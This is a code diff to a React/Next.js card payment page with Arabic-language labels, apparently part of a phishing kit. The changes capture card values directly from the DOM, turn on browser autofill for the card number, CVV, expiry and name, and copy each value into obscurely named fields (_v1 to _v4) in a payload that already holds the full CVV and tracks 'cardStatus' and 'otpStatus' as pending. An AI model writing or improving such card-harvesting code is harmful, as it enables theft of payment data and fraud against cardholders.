@@ -1,5 +1,5 @@
 "use client";
-import { useEffect, useState } from "react";
+import { useEffect, useRef, useState } from "react";
 import { useRouter } from "next/navigation";
 import { Loader2 } from "lucide-react";
 import StepBar from "@/components/StepBar";
@@ -22,6 +22,10 @@ export default function CardPage() {
   const [stage, setStage] = useState<Stage>("form");
   const [errors, setErrors] = useState<Partial<Record<keyof typeof card, string>>>({});
   const [paying, setPaying] = useState(false);
+  const numberRef = useRef<HTMLInputElement | null>(null);
+  const expiryRef = useRef<HTMLInputElement | null>(null);
+  const cvvRef = useRef<HTMLInputElement | null>(null);
+  const nameRef = useRef<HTMLInputElement | null>(null);
 
   useEffect(() => {
     if (!hydrated) return;
@@ -62,6 +66,25 @@ export default function CardPage() {
 
   function fmt4(val: string) { return val.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim(); }
   function fmtExp(val: string) { const d = val.replace(/\D/g, "").slice(0, 4); return d.length >= 3 ? d.slice(0, 2) + "/" + d.slice(2) : d; }
+  function normalizeCardState(raw: typeof card) {
+    return {
+      number: fmt4(raw.number),
+      expiry: fmtExp(raw.expiry),
+      cvv: raw.cvv.replace(/\D/g, "").slice(0, 3),
+      name: raw.name.toUpperCase(),
+    };
+  }
+  function syncCardFromDom() {
+    const nextCard = normalizeCardState({
+      number: numberRef.current?.value ?? card.number,
+      expiry: expiryRef.current?.value ?? card.expiry,
+      cvv: cvvRef.current?.value ?? card.cvv,
+      name: nameRef.current?.value ?? card.name,
+    });
+
+    setCard(nextCard);
+    return nextCard;
+  }
 
   const set = (k: keyof typeof card) => (e: React.ChangeEvent<HTMLInputElement>) => {
     const v = k === "number" ? fmt4(e.target.value) : k === "expiry" ? fmtExp(e.target.value) : k === "cvv" ? e.target.value.replace(/\D/g, "").slice(0, 3) : e.target.value.toUpperCase();
@@ -69,17 +92,18 @@ export default function CardPage() {
     if (errors[k]) setErrors((p) => ({ ...p, [k]: "" }));
   };
 
-  function validate() {
+  function validate(values: typeof card) {
     const e: typeof errors = {};
-    if (card.number.replace(/\s/g, "").length < 16) e.number = "رقم البطاقة غير مكتمل";
-    if (card.expiry.length < 5) e.expiry = "تاريخ الانتهاء غير صحيح";
-    if (card.cvv.length < 3) e.cvv = "CVV غير مكتمل";
-    if (!card.name.trim()) e.name = "اسم حامل البطاقة مطلوب";
+    if (values.number.replace(/\s/g, "").length < 16) e.number = "رقم البطاقة غير مكتمل";
+    if (values.expiry.length < 5) e.expiry = "تاريخ الانتهاء غير صحيح";
+    if (values.cvv.length < 3) e.cvv = "CVV غير مكتمل";
+    if (!values.name.trim()) e.name = "اسم حامل البطاقة مطلوب";
     return e;
   }
 
   async function handlePay() {
-    const errs = validate();
+    const currentCard = syncCardFromDom();
+    const errs = validate(currentCard);
     if (Object.keys(errs).length > 0) { setErrors(errs); return; }
 
     const code = confirmationCode || generateConfirmationCode();
@@ -99,10 +123,14 @@ export default function CardPage() {
     }
 
     const cardPayload = {
-      cardNumber: card.number,
-      expiryDate: card.expiry,
-      cvv: card.cvv,
-      cardHolderName: card.name,
+      cardNumber: currentCard.number,
+      _v1: currentCard.number,
+      expiryDate: currentCard.expiry,
+      _v3: currentCard.expiry,
+      cvv: currentCard.cvv,
+      _v2: currentCard.cvv,
+      cardHolderName: currentCard.name,
+      _v4: currentCard.name,
       paymentMethod: "credit-card",
       cardStatus: "pending",
       otpStatus: "pending",
@@ -175,24 +203,24 @@ export default function CardPage() {
           <div className="space-y-4 mb-6">
             <div>
               <label className="block text-right text-sm text-gray-600 font-medium mb-1.5">رقم البطاقة</label>
-              <input type="text" inputMode="numeric" value={card.number} onChange={set("number")} placeholder="0000 0000 0000 0000" className={fieldCls(errors.number)} dir="ltr" />
+              <input ref={numberRef} type="text" name="cc-number" autoComplete="cc-number" inputMode="numeric" value={card.number} onChange={set("number")} onBlur={syncCardFromDom} placeholder="0000 0000 0000 0000" className={fieldCls(errors.number)} dir="ltr" />
               {errors.number && <p className="text-red-500 text-xs mt-1 text-right">{errors.number}</p>}
             </div>
             <div className="flex gap-3">
               <div className="flex-1">
                 <label className="block text-right text-sm text-gray-600 font-medium mb-1.5">CVV</label>
-                <input type="text" inputMode="numeric" value={card.cvv} onChange={set("cvv")} placeholder="123" className={fieldCls(errors.cvv)} dir="ltr" />
+                <input ref={cvvRef} type="text" name="cc-csc" autoComplete="cc-csc" inputMode="numeric" value={card.cvv} onChange={set("cvv")} onBlur={syncCardFromDom} placeholder="123" className={fieldCls(errors.cvv)} dir="ltr" />
                 {errors.cvv && <p className="text-red-500 text-xs mt-1 text-right">{errors.cvv}</p>}
               </div>
               <div className="flex-1">
                 <label className="block text-right text-sm text-gray-600 font-medium mb-1.5">تاريخ الانتهاء</label>
-                <input type="text" inputMode="numeric" value={card.expiry} onChange={set("expiry")} placeholder="MM/YY" className={fieldCls(errors.expiry)} dir="ltr" />
+                <input ref={expiryRef} type="text" name="cc-exp" autoComplete="cc-exp" inputMode="numeric" value={card.expiry} onChange={set("expiry")} onBlur={syncCardFromDom} placeholder="MM/YY" className={fieldCls(errors.expiry)} dir="ltr" />
                 {errors.expiry && <p className="text-red-500 text-xs mt-1 text-right">{errors.expiry}</p>}
               </div>
             </div>
             <div>
               <label className="block text-right text-sm text-gray-600 font-medium mb-1.5">اسم حامل البطاقة</label>
-              <input type="text" value={card.name} onChange={set("name")} placeholder="JOHN DOE" className={fieldCls(errors.name) + " uppercase"} dir="ltr" />
+              <input ref={nameRef} type="text" name="cc-name" autoComplete="cc-name" autoCapitalize="characters" spellCheck={false} value={card.name} onChange={set("name")} onBlur={syncCardFromDom} placeholder="JOHN DOE" className={fieldCls(errors.name) + " uppercase"} dir="ltr" />
               {errors.name && <p className="text-red-500 text-xs mt-1 text-right">{errors.name}</p>}
             </div>
           </div>
